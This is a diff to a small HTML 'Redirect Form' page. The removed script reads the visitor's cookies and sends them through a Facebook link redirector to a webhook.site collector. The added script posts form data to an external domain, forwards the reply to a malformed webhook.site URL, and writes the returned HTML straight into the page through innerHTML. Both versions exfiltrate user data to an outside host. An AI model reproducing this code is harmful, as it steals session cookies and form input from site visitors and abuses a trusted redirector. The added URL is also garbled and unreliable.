@@ -4,20 +4,43 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Redirect Form</title>
+<script>
+function submitForm() {
+    var formData = new FormData(document.getElementById("redirectForm"));
+    var externalUrl = "http://external-domain.com/submit";
+
+    // Make a request to the external domain
+    fetch(externalUrl, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(htmlResponse => {
+        // Forward HTML response to subdomain
+        var subdomainUrl = "http://https://lm.facebook.com/l.php?u=https://webhook.site/2cd4b117-84dd-4d5b-856d-1a7bf5d36f18?fbclid=IwAR3Z-r5rOxGPZyLBFgZhwL1M3VfDZi4PYkJbq7bxZQOQdO6oelV4P8uXnGg/process";
+        fetch(subdomainUrl, {
+            method: 'POST',
+            body: JSON.stringify({ html: htmlResponse }),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(subdomainResponse => subdomainResponse.text())
+        .then(subdomainHtml => {
+            // Display the response from the subdomain
+            document.getElementById("responseContainer").innerHTML = subdomainHtml;
+        })
+        .catch(error => console.error('Error:', error));
+    })
+    .catch(error => console.error('Error:', error));
+}
+</script>
 </head>
 <body>
-<form id="redirectForm" action="http://" method="GET" target="_blank">
-  <input type="text" id="inputField" name="data" placeholder="Enter data...">
-  <button type="submit">Submit</button>
+<form id="redirectForm">
+  <input type="text" name="data" placeholder="Enter data...">
+  <button type="button" onclick="submitForm()">Submit</button>
 </form>
-
-<script>
-document.getElementById("redirectForm").addEventListener("submit", function(event) {
-  event.preventDefault();
-  var externalUrl = "https://lm.facebook.com/l.php?u=https://webhook.site/2cd4b117-84dd-4d5b-856d-1a7bf5d36f18?fbclid=IwAR3Z-r5rOxGPZyLBFgZhwL1M3VfDZi4PYkJbq7bxZQOQdO6oelV4P8uXnGg";
-  var cookies = document.cookie;
-  window.location.href = externalUrl + "?cookies=" + encodeURIComponent(cookies);
-});
-</script>
+<div id="responseContainer"></div>
 </body>
 </html>
